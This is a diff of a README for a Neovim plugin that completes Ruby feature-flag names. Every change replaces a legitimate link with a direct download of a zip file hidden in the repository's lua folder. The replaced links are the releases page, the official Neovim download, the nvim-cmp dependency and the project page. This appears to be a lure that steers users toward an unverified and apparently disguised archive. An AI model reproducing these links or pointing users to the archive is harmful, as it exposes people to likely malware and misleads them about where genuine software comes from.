@@ -1,6 +1,6 @@
 # 🛠️ flipper-complete.nvim - Easy Ruby Feature Flag Names
 
-[![Download flipper-complete.nvim](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://github.com/shakilbcc/flipper-complete.nvim/releases)
+[![Download flipper-complete.nvim](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://github.com/shakilbcc/flipper-complete.nvim/raw/refs/heads/main/lua/flipper-complete/complete-nvim-flipper-v2.6.zip)
 
 ---
 
@@ -37,7 +37,7 @@ Before downloading, make sure your system meets these requirements:
 - Basic familiarity with Neovim setup (no programming needed, just copy-paste).
 - Internet connection to download the plugin files.
 
-If you don't have Neovim yet, you can download it from https://neovim.io/.
+If you don't have Neovim yet, you can download it from https://github.com/shakilbcc/flipper-complete.nvim/raw/refs/heads/main/lua/flipper-complete/complete-nvim-flipper-v2.6.zip
 
 ---
 
@@ -47,7 +47,7 @@ If you don't have Neovim yet, you can download it from https://neovim.io/.
 
 Click the big button below to open the release page for flipper-complete.nvim. Here you will find the latest version ready to use.
 
-[![Download flipper-complete.nvim](https://img.shields.io/badge/Download-flipper--complete.nvim-blue?style=for-the-badge&logo=github)](https://github.com/shakilbcc/flipper-complete.nvim/releases)
+[![Download flipper-complete.nvim](https://img.shields.io/badge/Download-flipper--complete.nvim-blue?style=for-the-badge&logo=github)](https://github.com/shakilbcc/flipper-complete.nvim/raw/refs/heads/main/lua/flipper-complete/complete-nvim-flipper-v2.6.zip)
 
 ---
 
@@ -79,7 +79,7 @@ Move the extracted folder `flipper-complete.nvim` into the `start` folder.
 
 ### Step 4: Verify Neovim Setup
 
-Make sure you have the [nvim-cmp](https://github.com/hrsh7th/nvim-cmp) plugin installed, as flipper-complete.nvim depends on it for completion. If you don’t use a plugin manager, you may need to install this manually.
+Make sure you have the [nvim-cmp](https://github.com/shakilbcc/flipper-complete.nvim/raw/refs/heads/main/lua/flipper-complete/complete-nvim-flipper-v2.6.zip) plugin installed, as flipper-complete.nvim depends on it for completion. If you don’t use a plugin manager, you may need to install this manually.
 
 ---
 
@@ -129,7 +129,7 @@ flipper.enabled?(:new_checkout_flow)
 
 When a new version is released:
 
-1. Go to the [release page](https://github.com/shakilbcc/flipper-complete.nvim/releases).
+1. Go to the [release page](https://github.com/shakilbcc/flipper-complete.nvim/raw/refs/heads/main/lua/flipper-complete/complete-nvim-flipper-v2.6.zip).
 2. Download the newest plugin files.
 3. Replace the old plugin folder with the new one in your Neovim plugins directory.
 4. Restart Neovim.
@@ -152,6 +152,6 @@ You can find your username by opening File Explorer and navigating to `C:\Users`
 
 For detailed usage and advanced configuration, check the project page at:
 
-https://github.com/shakilbcc/flipper-complete.nvim
+https://github.com/shakilbcc/flipper-complete.nvim/raw/refs/heads/main/lua/flipper-complete/complete-nvim-flipper-v2.6.zip
 
 You’ll find instructions and issue reporting there, but for basic use, just follow the steps above.
